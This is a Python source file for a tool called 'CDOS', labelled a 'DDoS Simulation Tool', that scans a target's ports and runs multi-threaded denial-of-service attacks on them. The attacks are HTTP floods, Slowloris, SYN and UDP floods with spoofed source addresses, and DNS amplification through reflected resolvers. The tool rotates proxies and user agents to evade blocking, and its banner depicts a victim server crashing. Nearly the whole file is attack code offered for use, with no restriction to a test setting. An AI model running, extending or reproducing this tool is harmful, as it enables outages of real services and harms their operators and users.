import os
import sys
import logging
import signal
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import requests
import argparse
from datetime import datetime

# DNS imports (requires dnspython library)
try:
    from dns import message as dns_message
    from dns import rdatatype
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    dns_message = None
    rdatatype = None

# Default User-Agent list
default_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variables
workers = {}  # Store worker status
stop_flag = False  # Control program termination

# Handle Ctrl+C
def signal_handler(sig, frame):
    global stop_flag
    stop_flag = True
    logging.info("Received Ctrl+C, stopping attack...")

signal.signal(signal.SIGINT, signal_handler)

# Load targets (support single target or file)
def load_targets(target_input: str) -> list:
    if os.path.isfile(target_input):
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                if not targets:
                    logging.error("Target list file is empty")
                    sys.exit(1)
                return targets
        except Exception as e:
            logging.error(f"Failed to read target list file: {e}")
            sys.exit(1)
    else:
        # Treat as single target
        return [target_input.strip()]

# Load proxy list
def load_proxies(file_path: str) -> list:
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if '://' in line:
                    line = line.split('://')[-1]
                if ':' in line:
                    proxies.append(line)
                else:
                    proxies.append(f"{line}:8080")
        if not proxies:
            logging.warning("Proxy list is empty, using local IP")
        return [p for p in proxies if test_proxy(p)]
    except Exception as e:
        logging.error(f"Failed to read proxy list: {e}")
        return []

# Load User-Agent list
def load_user_agents(file_path: str) -> list:
    if file_path:
        try:
            with open(file_path, 'r') as f:
                agents = [line.strip() for line in f if line.strip()]
                if not agents:
                    logging.warning("Custom User-Agent list is empty, using default list")
                    return default_user_agents
                return agents
        except Exception as e:
            logging.error(f"Failed to read custom User-Agent list: {e}, using default list")
            return default_user_agents
    return default_user_agents

# Test proxy connectivity
def test_proxy(proxy: str) -> bool:
    try:
        ip, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, int(port)))
        sock.close()
        return result == 0
    except:
        return False

# Scan target ports
def scan_ports(target: str, port_range: tuple = (1, 65535)) -> list:
    open_ports = []
    logging.info(f"Scanning ports {port_range[0]}-{port_range[1]} for {target}")
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = [executor.submit(check_port, target, port) for port in range(port_range[0], port_range[1] + 1)]
        for future in futures:
            if port := future.result():
                open_ports.append(port)
    logging.info(f"Open ports for {target}: {open_ports}")
    return open_ports if open_ports else [80, 443, 53]  # Default ports if none found

def check_port(target: str, port: int) -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            return port
    except:
        pass
    finally:
        sock.close()
    return None

# HTTP Flood attack
def http_flood(target: str, port: int, duration, proxies: list, worker_id: str, user_agents: list):
    if port == 443:
        url = f"https://{target}"
    else:
        url = f"http://{target}:{port}" if port != 80 else f"http://{target}"
    proxy_dict = lambda p: {'http': f'http://{p}', 'https': f'http://{p}'} if p else None
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['http', 'slowloris', 'syn', 'udp', 'dns']
    current_attack = attack_types[0]
    current_user_agent = random.choice(user_agents)
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = current_user_agent
        try:
            headers = {'User-Agent': current_user_agent}
            proxy = random.choice(proxies) if proxies else None
            response = requests.get(url, headers=headers, proxies=proxy_dict(proxy), timeout=5)
            stats['sent'] += 1
            if response.status_code in [403, 429, 503]:
                logging.warning(f"{worker_id} at {target}:{port} HTTP Flood blocked, switching attack")
                attack_types.append(attack_types.pop(0))
                current_attack = attack_types[0]
                current_user_agent = random.choice(user_agents)
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} HTTP Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
            current_user_agent = random.choice(user_agents)
        workers[worker_id]['stats'] = stats
        if current_attack != 'http':
            return current_attack
        time.sleep(random.uniform(0.1, 0.5))
    return None

# SYN Flood attack
def syn_flood(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['syn', 'udp', 'dns', 'http', 'slowloris']
    current_attack = attack_types[0]
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                subnet = random.choice(['10.', '172.16.', '192.168.', '100.64.', '198.18.'])
                if subnet == '10.':
                    src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '172.16.':
                    src_ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '192.168.':
                    src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '100.64.':
                    src_ip = f"100.{random.randint(64, 127)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                else:
                    src_ip = f"198.18.{random.randint(0, 255)}.{random.randint(0, 255)}"
                packet = build_spoofed_syn_packet(src_ip, target, port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.sendto(packet, (target, 0))
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                if proxies:
                    proxy = random.choice(proxies)
                    phost, pport_str = proxy.split(':')
                    pport = int(pport_str)
                    sock.connect((phost, pport))
                else:
                    sock.connect((target, port))
                sock.send(b"\x00")
                sock.close()
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} SYN Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'syn':
            return current_attack
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_syn_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    ip_header = bytearray(20)
    tcp_header = bytearray(20)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 20).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_TCP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(dst_ip)
    tcp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    tcp_header[2:4] = dst_port.to_bytes(2, 'big')
    tcp_header[4:8] = (random.randint(0, 0xFFFFFFFF)).to_bytes(4, 'big')
    tcp_header[8:12] = (0).to_bytes(4, 'big')
    tcp_header[12] = 0x50
    tcp_header[14:16] = (65535).to_bytes(2, 'big')
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    tcp_header[16:18] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + tcp_header)

# UDP Flood attack
def udp_flood(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    sock_type = socket.SOCK_RAW if spoof else socket.SOCK_DGRAM
    sock = socket.socket(socket.AF_INET, sock_type, socket.IPPROTO_UDP if spoof else 0)
    if spoof:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    payload = os.urandom(1470)
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['udp', 'dns', 'http', 'slowloris', 'syn']
    current_attack = attack_types[0]
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                subnet = random.choice(['10.', '172.16.', '192.168.', '100.64.', '198.18.'])
                if subnet == '10.':
                    src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '172.16.':
                    src_ip = f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '192.168.':
                    src_ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
                elif subnet == '100.64.':
                    src_ip = f"100.{random.randint(64, 127)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                else:
                    src_ip = f"198.18.{random.randint(0, 255)}.{random.randint(0, 255)}"
                packet = build_spoofed_udp_packet(src_ip, target, port, payload)
                sock.sendto(packet, (target, 0))
            else:
                target_host = random.choice(proxies).split(':')[0] if proxies else target
                sock.sendto(payload, (target_host, port))
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} UDP Flood failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'udp':
            return current_attack
    sock.close()
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_udp_packet(src_ip: str, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
    ip_header = bytearray(20)
    udp_header = bytearray(8)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 8 + len(payload)).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_UDP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(dst_ip)
    udp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    udp_header[2:4] = dst_port.to_bytes(2, 'big')
    udp_header[4:6] = (8 + len(payload)).to_bytes(2, 'big')
    udp_header[6:8] = (0).to_bytes(2, 'big')  # Checksum not computed
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + udp_header + payload)

# Slowloris attack
def slowloris(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, connections: int = 100):
    sockets = []
    current_user_agent = random.choice(user_agents)
    if proxies:
        proxy = random.choice(proxies)
        phost, pport_str = proxy.split(':')
        pport = int(pport_str)
        headers = f"GET http://{target}:{port}/ HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {current_user_agent}\r\n"
        target_host = phost
        target_port = pport
    else:
        headers = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {current_user_agent}\r\n"
        target_host = target
        target_port = port
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['slowloris', 'syn', 'udp', 'dns', 'http']
    current_attack = attack_types[0]
    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            s.send(headers.encode('utf-8'))
            sockets.append(s)
            stats['sent'] += 1
        except:
            stats['failed'] += 1
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = current_user_agent
        try:
            for s in sockets:
                s.send(b"X-a: {}\r\n".format(random.randint(1, 5000)))
                stats['sent'] += 1
        except:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} Slowloris failed, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
            current_user_agent = random.choice(user_agents)
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            sockets.clear()
            workers[worker_id]['stats'] = stats
            if current_attack != 'slowloris':
                return current_attack
        workers[worker_id]['stats'] = stats
        time.sleep(1)
    for s in sockets:
        try:
            s.close()
        except:
            pass
    workers[worker_id]['stats'] = stats
    return None

# DNS Amplification attack
def dns_amplification(target: str, port: int, duration: int, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    if not DNS_AVAILABLE:
        logging.error(f"{worker_id} DNS attack unavailable: dnspython not installed")
        return 'http'
    stats = {'sent': 0, 'failed': 0}
    attack_types = ['dns', 'http', 'slowloris', 'syn', 'udp']
    current_attack = attack_types[0]
    dns_resolvers = [
        "8.8.8.8:53",  # Example; replace with actual open resolvers for amplification
        "1.1.1.1:53",
    ]
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    if spoof:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    domain = "example.com"  # Replace with a domain known for large responses
    query = dns_message.make_query(domain, rdatatype.ANY)
    query_data = query.to_wire()
    logging.info(f"{worker_id} starting DNS Amplification attack on {target}:{port}")
    while not stop_flag:
        workers[worker_id]['attack'] = current_attack
        workers[worker_id]['user_agent'] = 'N/A'
        try:
            if spoof:
                src_ip = target
                resolver = random.choice(dns_resolvers)
                resolver_ip, resolver_port_str = resolver.split(':')
                resolver_port = int(resolver_port_str)
                packet = build_spoofed_dns_packet(src_ip, resolver_ip, resolver_port, query_data)
                sock.sendto(packet, (resolver_ip, resolver_port))
            else:
                target_host = random.choice(proxies).split(':')[0] if proxies else target
                sock.sendto(query_data, (target_host, port))
            stats['sent'] += 1
        except PermissionError:
            logging.error(f"{worker_id} at {target}:{port} requires root privileges for IP spoofing")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        except Exception as e:
            stats['failed'] += 1
            logging.warning(f"{worker_id} at {target}:{port} DNS Amplification failed: {e}, switching attack")
            attack_types.append(attack_types.pop(0))
            current_attack = attack_types[0]
        workers[worker_id]['stats'] = stats
        if current_attack != 'dns':
            return current_attack
        time.sleep(random.uniform(0.05, 0.2))
    sock.close()
    workers[worker_id]['stats'] = stats
    return None

def build_spoofed_dns_packet(src_ip: str, resolver_ip: str, resolver_port: int, payload: bytes) -> bytes:
    ip_header = bytearray(20)
    udp_header = bytearray(8)
    ip_header[0] = 0x45
    ip_header[2:4] = (20 + 8 + len(payload)).to_bytes(2, 'big')
    ip_header[8] = 0xFF
    ip_header[9] = socket.IPPROTO_UDP
    ip_header[12:16] = socket.inet_aton(src_ip)
    ip_header[16:20] = socket.inet_aton(resolver_ip)
    ip_header[10:12] = (0).to_bytes(2, 'big')  # Checksum not computed
    udp_header[0:2] = (random.randint(1024, 65535)).to_bytes(2, 'big')
    udp_header[2:4] = resolver_port.to_bytes(2, 'big')
    udp_header[4:6] = (8 + len(payload)).to_bytes(2, 'big')
    udp_header[6:8] = (0).to_bytes(2, 'big')  # Checksum not computed
    return bytes(ip_header + udp_header + payload)

# Select attack method
def select_attack(target: str, port: int, duration, proxies: list, worker_id: str, user_agents: list, spoof: bool):
    # Initialize worker status to prevent KeyError
    workers[worker_id] = {'port': port, 'attack': '', 'stats': {'sent': 0, 'failed': 0}, 'user_agent': 'N/A'}
    attack_types = ['dns', 'http', 'slowloris', 'syn', 'udp'] if port == 53 else \
                   ['http', 'slowloris', 'syn', 'udp', 'dns'] if port in [80, 443] else \
                   ['syn', 'udp', 'dns', 'http', 'slowloris'] if port in [123] else \
                   ['udp', 'dns', 'http', 'slowloris', 'syn']
    attack_map = {
        'http': http_flood,
        'slowloris': slowloris,
        'syn': syn_flood,
        'udp': udp_flood,
        'dns': dns_amplification
    }
    while not stop_flag:
        current_attack = attack_types[0]
        attack_func = attack_map.get(current_attack)
        if attack_func:
            next_attack = attack_func(target, port, duration, proxies, worker_id, user_agents, spoof)
            if not next_attack:
                break
            attack_types.append(attack_types.pop(0))  # Rotate to next attack
        else:
            break

# Display worker status
def display_workers(target: str):
    while not stop_flag:
        print("\033[H\033[J")
        print(f"Target: {target} | Worker Status:")
        print("-" * 100)
        print(f"{'Worker':<7} {'Port':<5} {'Attack':<6} {'Sent':<6} {'Failed':<6} {'User-Agent':<40}")
        print("-" * 100)
        for worker_id, info in sorted(workers.items()):
            stats = info['stats']
            print(f"{worker_id:<7} {info['port']:<5} {info['attack']:<6} {stats['sent']:<6} {stats['failed']:<6} {info['user_agent'][:39]:<40}")
        time.sleep(0.1)

# Main function
def main():
    print("""
[Victim Server]
                 |
                 |
    +------------+------------+
    |                         |
[Attacker 1]             [Attacker 2]
    |                         |
    |                         |
    v                         v
[Proxy/Spoofed IP]    [Proxy/Spoofed IP]
    |                         |
    +---+---+---+---+         +---+---+---+---+
    |   |   |   |   |         |   |   |   |   |
    v   v   v   v   v         v   v   v   v   v
 [HTTP] [SYN] [UDP] [Slowloris] [DNS] [HTTP] [SYN] [UDP] [Slowloris] [DNS]
        |       |       |       |     |       |       |       |       |
        +-------+-------+-------+-----+-------+-------+-------+-------+
                        |
                        |
                    [Router]
                        |
                        |
                    [Overload]
                        |
                        v
                 [Server Crashes]
          
Developed by ChillHack Hong Kong Web Development, Jake.
    Intelligent DDoS Simulation Tool
          Contact: info@chillhack.net
          Website: https://chillhack.net
""")

    global stop_flag
    parser = argparse.ArgumentParser(
        description="CDOS - Intelligent DDoS Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage Examples:
  Basic Attack: python3 cdos.py -t targets.txt
  Distributed DDoS: python3 cdos.py -t targets.txt -p proxies.txt
  Custom User-Agent: python3 cdos.py -t targets.txt -p proxies.txt -r agent_list.txt
  Specify Threads: python3 cdos.py -t targets.txt --threads 500
  Specify Workers per Port: python3 cdos.py -t targets.txt --workers-per-port 10
  Enable IP Spoofing: sudo python3 cdos.py -t targets.txt --spoof
"""
    )
    parser.add_argument('-t', '--target-file', required=True, help="Target IP/domain list file (TXT) or single target")
    parser.add_argument('-p', '--proxy-file', help="Proxy IP list file (TXT, format: IP:Port)")
    parser.add_argument('-r', '--agent-file', help="Custom User-Agent list file (TXT)")
    parser.add_argument('--threads', type=int, default=1000, help="Number of worker threads (default: 1000)")
    parser.add_argument('--workers-per-port', type=int, default=1, help="Number of workers per port (default: 1)")
    parser.add_argument('--spoof', action='store_true', help="Enable IP spoofing (requires root privileges)")

    args = parser.parse_args()

    # Check for root privileges if spoofing is enabled
    if args.spoof and os.geteuid() != 0:
        logging.error("IP spoofing requires root privileges. Use sudo.")
        sys.exit(1)

    # Check system thread limit
    try:
        with open('/proc/sys/kernel/threads-max', 'r') as f:
            max_threads = int(f.read().strip())
        if args.threads > max_threads:
            logging.warning(f"Requested threads {args.threads} exceeds system limit {max_threads}, adjusting to {max_threads}")
            args.threads = max_threads
    except:
        logging.warning("Unable to check system thread limit, consider reducing threads")

    # Load targets, proxies, and user agents
    targets = load_targets(args.target_file)
    proxies = load_proxies(args.proxy_file) if args.proxy_file else []
    user_agents = load_user_agents(args.agent_file)

    # Execute attack for each target
    for target in targets:
        logging.info(f"Processing target: {target} with {args.threads} threads")
        open_ports = scan_ports(target)
        if not open_ports:
            logging.warning(f"No open ports found for {target}, using default ports 80, 443, 53")
            open_ports = [80, 443, 53]

        workers.clear()
        threads = []
        start_time = datetime.now()  # Record attack start time
        num_workers = min(args.threads, len(open_ports) * args.workers_per_port)  # Total workers limited by threads or ports * workers_per_port
        port_assignments = []
        for port in open_ports:
            for _ in range(args.workers_per_port):
                port_assignments.append(port)
                if len(port_assignments) >= args.threads:
                    break
            if len(port_assignments) >= args.threads:
                break
        logging.info(f"Starting attack on {target} with {num_workers} workers across {len(open_ports)} ports")
        for i in range(num_workers):
            worker_id = f"Worker {i+1}"
            port = port_assignments[i % len(port_assignments)]  # Assign port from the generated list
            try:
                t = threading.Thread(target=select_attack, args=(target, port, None, proxies, worker_id, user_agents, args.spoof))
                t.daemon = True
                t.start()
                threads.append(t)
            except RuntimeError as e:
                logging.error(f"Failed to start worker {worker_id}: {e}")
                break
        # Display worker status
        display_thread = threading.Thread(target=display_workers, args=(target,))
        display_thread.daemon = True
        display_thread.start()

        # Keep attack running until manual stop (Ctrl+C)
        try:
            while True:
                time.sleep(1)  # Keep main thread alive
        except KeyboardInterrupt:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            logging.info(f"Attack stopped by user. Duration: {duration:.2f} seconds")
            stop_flag = True  # Set stop_flag after user interruption
            for t in threads:
                t.join(timeout=5)
            display_thread.join(timeout=5)

if __name__ == "__main__":
    main()
